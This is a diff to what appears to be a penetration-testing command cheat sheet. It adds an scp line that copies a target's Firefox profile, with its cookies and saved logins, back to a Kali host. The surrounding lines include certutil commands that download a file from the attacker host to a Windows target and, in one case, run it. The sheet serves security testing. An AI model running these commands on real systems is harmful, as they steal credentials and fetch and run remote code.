@@ -33,6 +33,7 @@ SCP # 1:scp -P 22 <filename1> kali@<kali>:/home/kali/ # Transfer file from targe
 SCP # 1:scp -P 22 <user>@<target>:/tmp/output.txt /home/kali/share/results/ # Download file from target to Kali; kali-machine
 SCP # 1:scp -P <port> -i <filename1> <filename2> <user>@<target>:<path> #transfer file to target over SSH using private key authentication; kali-machine
 SCP # 1:scp -i <filename1> -P <port> <user>@<target>:"C:/Users/<user>/Desktop/<filename2>" <path> #transfer file from Windows target to Kali via SCP using Windows drive path with forward slashes; kali-machine
+SCP # 1:scp -r -P <port> <user>@<target>:/home/<user>/.mozilla/firefox/<filename1> . #recursively download Firefox profile directory from Linux target to current Kali directory for browser history, cookies, saved logins, and session artifact review; kali-machine
 
 Certutil # 1:certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/<filename1> c:\windows\temp\<filename1> # Download file with certutil. Most Windows systems have it; target-machine
 Certutil # 1:certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/<filename1> c:\windows\temp\<filename1> && c:\windows\temp\<filename1> # Download and execute in one line; target-machine
